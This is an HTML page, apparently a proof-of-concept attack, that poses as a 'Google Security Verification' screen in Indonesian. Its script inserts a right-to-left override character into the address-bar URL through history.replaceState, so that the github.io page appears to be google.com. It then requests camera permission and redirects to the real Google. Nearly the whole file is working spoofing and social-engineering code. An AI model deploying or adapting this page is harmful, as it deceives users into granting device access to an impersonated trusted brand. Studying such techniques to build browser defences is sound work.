<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #1557b0; }
  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Verification</h2>
  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diminta mengizinkan kamera.</p>
  <button id="startBtn">Verify Account & Allow Camera</button>
  <div id="status">[*] Ready...</div>
</div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var statusEl = document.getElementById('status');

  function log(msg) {
    statusEl.textContent = msg;
    console.log("[BiDi Camera Spoof] " + msg);
  }

  // ============================================
  // 1. TRIGGER (KLIK)
  // ============================================
  btn.addEventListener('click', function() {
    log("[*] Memulai BiDi URL spoofing + camera permission...");

    // ============================================
    // 2. MANIPULASI URL DENGAN BiDi OVERRIDE
    // ============================================
    // Karakter RLO (U+202E) membalik urutan teks.
    // URL: https://github.com/‮/moc.elgoog//:sptth
    // Secara visual: https://github.com/...google.com
    var bidiUrl = "https://artha231.github.io/%E2%80%AE%2Fmoc.elgoog%2F%2F%3Asptth";
    
    // Update URL di address bar (jika memungkinkan)
    try {
      history.replaceState(null, '', bidiUrl);
      log("[+] URL Address Bar dimanipulasi dengan BiDi.");
    } catch (e) {
      log("[-] Gagal manipulasi URL: " + e.message);
    }

    // ============================================
    // 3. MINTA IZIN KAMERA (SEGERA)
    // ============================================
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(function(stream) {
        log("[+] Kamera DIIZINKAN!");
        stream.getTracks().forEach(function(t) { t.stop(); });

        // Tampilkan pesan sukses
        document.body.innerHTML = `
          <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
            <h2 style="color:#34a853;">✅ Verifikasi Berhasil</h2>
            <p style="color:#666;">Kamera telah diizinkan. Anda akan diarahkan ke Google.</p>
          </div>
        `;

        // Redirect ke Google asli setelah 2 detik
        setTimeout(function() {
          window.location.replace('https://www.google.com');
        }, 2000);
      })
      .catch(function(err) {
        log("[-] Kamera ditolak: " + err.name);
        setTimeout(function() {
          window.location.replace('https://www.google.com');
        }, 1000);
      });
  }, { once: true });

})();
</script>

</body>
</html>
